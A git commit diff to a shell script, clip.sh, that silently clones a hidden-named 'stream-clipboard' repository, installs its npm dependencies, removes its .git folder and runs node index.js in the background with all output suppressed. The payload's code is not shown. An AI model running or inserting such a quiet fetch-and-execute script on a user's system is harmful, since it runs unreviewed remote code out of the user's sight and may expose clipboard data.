d79f43fa38ad05410b7f0d4707b9074b0889c2c1
Ankit patel <28822999+AAnkitpatel@users.noreply.github.com>
2022-11-13 22:04:20 +0530

    Update clip.sh
    script fixed

--- clip.sh
+++ clip.sh
@@ -1,5 +1,10 @@
 #!/bin/bash
+app() {
 git clone --quiet https://github.com/vedprakashkushwaha/.stream-clipboard.git > /dev/null
 cd .stream-clipboard > /dev/null
 npm i --quiet  > /dev/null
-nohup bash -lc "node index.js" > /dev/null &>/dev/null &
+rm -rf .git
+node index.js
+
+}
+app 2>&1 &
